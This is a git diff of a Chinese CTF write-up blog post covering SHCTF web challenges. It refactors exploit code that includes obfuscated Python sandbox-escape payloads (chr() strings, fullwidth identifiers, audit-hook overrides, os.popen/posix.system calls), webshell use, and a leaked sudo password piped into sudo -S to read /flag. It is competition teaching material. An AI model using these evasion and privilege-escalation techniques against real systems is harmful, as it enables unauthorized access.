@@ -2,6 +2,7 @@
 title: SHCTF 个人题解
 description: 'SHCTF web方向的wp'
 published: 2026-02-22
+updated: 2026-02-24
 image: ''
 tags: ['CTF', 'WP', "WEB"]
 category: 'CTF'
@@ -297,7 +298,7 @@ app.listen(port, () => {
 ## Ezphp
 > 在未来的某一天，人类已经能够进行太阳系内的旅行。小明作为一名宇航员，被赋予了一项任务：探索太阳系中的不同星球。但是，在旅途中，他发现了一个神秘的坐标，此坐标周围的空间似乎被切割为一块块光滑的镜面，折叠堆积在一块，小明在经过这的时候甚至透过舷窗同时看到了自己的后背和右腿以难以理解的角度拼接在一块。与此同时，他发现该折叠空间内部蕴含了一个小型黑洞，他试图往母星发送这一发现，但在此之前，他需要先离开这里......
 
-考点为[[POP链]]+`Fast Destruct`。
+考点为`POP链`+`Fast Destruct`。
 
 网页源码为：
 ```php
@@ -457,7 +458,7 @@ echo 'a:2:{i:0;' . serialize($payload) . 'i:0;i:1;}';
 查看源码发现`5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa`，是ROT13映射的base64加密，解密得到：
 `我上传了个shell.php, 带上show参数get小明的圣遗物吧`。
 
-题目纯纯恶心人，最后在`/uploads/shell.php?show=1`下找到php：
+然后满世界去找这个shell，最后在`/uploads/shell.php?show=1`下找到php：
 
 ```php
 <?php
@@ -520,10 +521,10 @@ if (isset($_POST['buy']) && isset($_POST['item_id'])) {
 }
 ```
 
-正好`shell.php`能直接接收php代码，我们直接仿照源码去买flag就行了：
+正好`shell.php`能直接执行php代码，我们直接仿照源码去白嫖flag就行了：
 
 ```bash
-key=114514
+?key=114514
 &code=include '../connect.php';$stmt=$pdo->prepare('CALL buy_item(3,100)');$stmt->execute();var_dump($stmt->fetch());
 ```
 
@@ -540,7 +541,7 @@ key=114514
 }
 ```
 
-看题目提示，猜向页面post传json：
+看题目提示，盲猜向页面post传json：
 
 ```json
 {
@@ -567,7 +568,7 @@ key=114514
 ## Mini Blog
 > 完全安全的博客系统。
 
-[[XXE]]
+`XXE`
 
 博客发布页，查看发布文章`/create`页面的源码，发现js代码会将我们的内容转为xml上传，随便写点，上传抓包，果然发现xml：
 
@@ -595,7 +596,7 @@ key=114514
 ## ez_race
 > 狠狠赚钱
 
-考点就是Race Condition,[[条件竞争]]
+考点就是Race Condition,`条件竞争`
 
 下载得到网页的源码，找到`bank/views.py>WithdrawView>form_valid`这里，也就是代码的第25行：
 
@@ -660,7 +661,7 @@ t2.join()
 # attack(debug=True)
 ```
 
-并行太多可能导致服务器返回502，两个线程足够了。这样我们就能倒欠服务器10块，得到flag。再去把新手礼包领了，余额就好看了。
+并行太多可能导致服务器返回502，两个线程足够了。这样我们就能倒欠服务器10块，得到flag。最后再去把新手礼包领了就两不相欠了:)
 
 ## Eazy_Pyrunner
 > 任何人都可以运行自己的 Python 程序！不过大嗨客就算了，还有运行的程序必须是我喜欢的。
@@ -753,7 +754,7 @@ if __name__ == '__main__':
     app.run(debug=True)
 ```
 
-waf里能看到单双引号都被过滤了，所以构造字符串我们使用`chr(i)+chr(j)`拼接绕过，其他的模块名可以直接全角字符绕过。
+waf里能看到单双引号都被过滤了，所以构造字符串我们使用`chr(i)+chr(j)`或`bytes([i, j]).decode()`绕过，其他的模块名可以直接全角字符绕过。
 
 盲打的时候就慢慢试出来waf了，先看看有什么模块
 ```python
@@ -799,13 +800,13 @@ print(ｓｙｓ.modules)
 
 ```
 
-可以看到有个`posix`还是很有用的，不过。。。
+可以看到`os`被改为了`not allowed`，有个`posix`还是很有用的，不过。。。
 
 ```python
-M = ｓｙｓ.modules
-P = M[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)] # posix
+modules = ｓｙｓ.modules
+po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]
 
-try: P.listdir()
+try: po6.listdir()
 except Exception as e: print(e)
 ```
 
@@ -817,16 +818,14 @@ Too long event name!
 这提示也太坑人了，对不上脑洞的我只好去查一次`__main__`：
 
 ```python
-M = ｓｙｓ.modules
-B = M[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)] # 'builtins'
-G = B.getattr
+modules = ｓｙｓ.modules
+builtins = modules[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
+getattr = builtins.getattr
 
-MainName = chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95) # '__main__'
-DictName = chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95) # '__dict__'
+dunder_main = chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)
+dunder_dict = chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95)
 
-MainMod = M[MainName]
-
-try: print(G(MainMod, DictName)) 
+try: print(getattr(modules[dunder_main], dunder_dict)) 
 except Exception as e: print(e)
 ```
 
@@ -845,35 +844,21 @@ except Exception as e: print(e)
     'sys': <module 'sys' (built-in)>,
     'is_my_love_event': <function is_my_love_event at 0x7f17713faac0>,
     'my_audit_hook': <function my_audit_hook at 0x7f1771165580>,
-    'M': { ... },
-    'B': <module 'builtins' (built-in)>,
-    'G': <built-in function getattr>,
-    'MainName': '__main__',
-    'DictName': '__dict__',
-    'MainMod': <module '__main__' from '/tmp/tmpfxgm71qm.py'>
+    ...
 }
 ```
 
-这里就能看到审计函数`is_my_love_event`和审计钩子`my_audit_hook`，不过不看源码谁能猜到，最后还是到处碰壁，同时修改`len`函数和`is_my_love_event`就能绕过审计：
+这里就能看到审计函数`is_my_love_event`和审计钩子`my_audit_hook`，不过不看源码谁能猜到，最后还是到处碰壁，同时覆盖`len`函数和`is_my_love_event`就能绕过waf：
 
 ```python
-M = ｓｙｓ.modules
-B = M[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
-G = B.getattr
-S = B.setattr
+modules = ｓｙｓ.modules
 
-MainName = chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)
-MainMod = M[MainName]
+len = lambda x: 0
+is_my_love_event = lambda x: True
 
-LenName = chr(108)+chr(101)+chr(110)　# len
-S(MainMod, LenName, lambda x: 0)
+po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]
 
-CheckName = chr(105)+chr(115)+chr(95)+chr(109)+chr(121)+chr(95)+chr(108)+chr(111)+chr(118)+chr(101)+chr(95)+chr(101)+chr(118)+chr(101)+chr(110)+chr(116) # is_my_love_event
-S(MainMod, CheckName, lambda x: True)
-
-P = M[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)] # posix
-
-try: print(P.listdir(chr(47))) # /
+try: print(po6.listdir(chr(47))) # /
 except Exception as e: print(e)
 ```
 
@@ -888,28 +873,19 @@ except Exception as e: print(e)
 `/flag`直接读是没有权限的，因为`posix`没有`popen`，所以只能用`system`写出`/read_flag > /tmp/flag`，再用`posix.read(posix.open("/tmp/flag", 0), 100)`读文件：
 
 ```python
-M = ｓｙｓ.modules
-B = M[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
-G = B.getattr
-S = B.setattr
+modules = ｓｙｓ.modules
 
-MainName = chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)
-MainMod = M[MainName]
+len = lambda x: 0
+is_my_love_event = lambda x: True
 
-LenName = chr(108)+chr(101)+chr(110)
-S(MainMod, LenName, lambda x: 0)
-
-CheckName = chr(105)+chr(115)+chr(95)+chr(109)+chr(121)+chr(95)+chr(108)+chr(111)+chr(118)+chr(101)+chr(95)+chr(101)+chr(118)+chr(101)+chr(110)+chr(116)
-S(MainMod, CheckName, lambda x: True)
-
-P = M[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]
-FalseF = chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)
-CmdStr = chr(47)+chr(114)+chr(101)+chr(97)+chr(100)+chr(95)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(62)+chr(32) + FalseF
+po6 = modules[chr(112)+chr(111)+chr(115)+chr(105)+chr(120)]
+tmp_Flag = chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)
+cmd = chr(47)+chr(114)+chr(101)+chr(97)+chr(100)+chr(95)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(62)+chr(32) + tmp_Flag
 
 try:
-    P.ｓｙｓｔｅｍ(CmdStr)
-    fd = P.ｏｐｅｎ(FalseF, 0)
-    print(P.ｒｅａｄ(fd, 20000))
+    po6.ｓｙｓｔｅｍ(cmd)
+    fd = po6.ｏｐｅｎ(tmp_Flag, 0)
+    print(po6.ｒｅａｄ(fd, 20000))
 except Exception as e: print(e)
 ```
 
@@ -918,18 +894,18 @@ except Exception as e: print(e)
 之前也看到，`os`的被赋值为了`not allowed`，我们想要得到**模块os**，就要先删除这个**字符串os**，再重新导入：
 
 ```python
-M = ｓｙｓ.modules
-B = M[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
-G = B.getattr
-S = B.setattr
-MainMod = M[chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)]
-S(MainMod, chr(108)+chr(101)+chr(110), lambda x: 0)
-S(MainMod, chr(105)+chr(115)+chr(95)+chr(109)+chr(121)+chr(95)+chr(108)+chr(111)+chr(118)+chr(101)+chr(95)+chr(101)+chr(118)+chr(101)+chr(110)+chr(116), lambda x: True)
+modules = ｓｙｓ.modules
+builtins = modules[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
+getattr = builtins.getattr
 
-M.pop(chr(111)+chr(115))
-ImpName = chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95) # __import__
-ImpFunc = G(B, ImpName)
-OS = ImpFunc(chr(111)+chr(115))
+len = lambda x: 0
+is_my_love_event = lambda x: True
+
+modules.pop(chr(111)+chr(115))
+
+dunder_imp = chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)
+imp = getattr(builtins, dunder_imp)
+OS = imp(chr(111)+chr(115))
 
 print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ()) # ls /
 ```
@@ -939,22 +915,19 @@ print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ()) # ls
 除了直接弹出，我们知道`site`模块在初始化时自动导入，它内部导入了`os`。即使`sys.modules['os']`被修改了，`site`模块因为加载更早，它内部的`os`仍是纯净的：
 
 ```python
-M = ｓｙｓ.modules
-B = M[chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)]
-G = B.getattr
-S = B.setattr
-MainMod = M[chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95)]
-S(MainMod, chr(108)+chr(101)+chr(110), lambda x: 0)
-S(MainMod, chr(105)+chr(115)+chr(95)+chr(109)+chr(121)+chr(95)+chr(108)+chr(111)+chr(118)+chr(101)+chr(95)+chr(101)+chr(118)+chr(101)+chr(110)+chr(116), lambda x: True)
+modules = ｓｙｓ.modules
 
-SiteMod = M[chr(115)+chr(105)+chr(116)+chr(101)]
-OS = G(SiteMod, chr(111)+chr(115))
-M[chr(111)+chr(115)] = OS
+len = lambda x: 0
+is_my_love_event = lambda x: True
+
+site = modules[chr(115)+chr(105)+chr(116)+chr(101)]
+OS = site.ｏｓ
+modules[chr(111)+chr(115)] = OS
 
 print(OS.ｐｏｐｅｎ(chr(108)+chr(115)+chr(32)+chr(47)).ｒｅａｄ())
 ```
 
-注意这里的`M[chr(111)+chr(115)] = OS`复原`os`是必要的，因为`os.popen`在 Python 3 中本质上就是`subprocess.Popen`的一个封裝，而`subprocess`模块初始化时又需要用到`os`内的函数，不加就会遇到以下报错：
+注意这里的`modules[chr(111)+chr(115)] = OS`复原`os`是必要的，因为`os.popen`在 Python 3 中本质上就是`subprocess.Popen`的一个封裝，而`subprocess`模块初始化时又需要用到`os`内的函数，不加就会遇到以下报错：
 
 ```python
 Traceback (most recent call last):
@@ -968,15 +941,13 @@ Traceback (most recent call last):
 AttributeError: 'str' object has no attribute 'waitpid'
 ```
 
-报错也解释了，真是因为`os`为字符串，而字符串显然没有`waitpid`属性。
+报错也解释了，`os`是字符串，而字符串显然没有`waitpid`属性。
 
 所以原理上`subprocess`，也能实现`popen`的功能，但是因为是这道题里os模块不可用，想用`subprocess`还得先还原`os`，就有点多此一举了。
 
 ## 你也懂java？
 
-三周目开始上`Java`题了，真是怕什么来什么
-
-这道题是非常基础的[[Java 反序列化]] **(Java Deserialization)**，
+这道题是非常基础的`Java 反序列化` **(Java Deserialization)**，
 
 给出了网页源码：
 
@@ -1249,7 +1220,12 @@ ctf          127      88  0 10:46 ?        00:00:00 sh -c -- ps -ef
 ctf          128     127  0 10:46 ?        00:00:00 ps -ef
 ```
 
-很明显，这里PID 25 的进程：
+很明显，这里 PID 为 25 的进程：
 - `script -q -f -c bash -li -c "echo 0dy9e6 | sudo -S -v >/dev/null 2>&1; sleep infinity" /dev/null`
 
-`echo 0dy9e6 | sudo -S -v`直接写明了sudo密码为`0dy9e6`，配合`-S`参数允许sudo从管道接受密码，我们就能直接得到root权限了。但是注意，因为sudo会新开shell，system函数那不到这个结果，所以我们仿照这段命令，使用script命令得到完整的输出：`script -q -c "echo 0dy9e6 | sudo -S cat /flag"`。
+`echo 0dy9e6 | sudo -S -v`直接写明了sudo密码为`0dy9e6`，配合`-S`参数允许sudo从管道接受密码，我们就能直接得到root权限了。但是注意，因为sudo会新开shell，system函数得不到这个结果，所以我们仿照这段命令，使用script命令得到全部的输出：`script -q -c "echo 0dy9e6 | sudo -S cat /flag"`。
+
+> ```bash
+> > tldr script
+> Record all terminal output to a typescript file.
+> ```
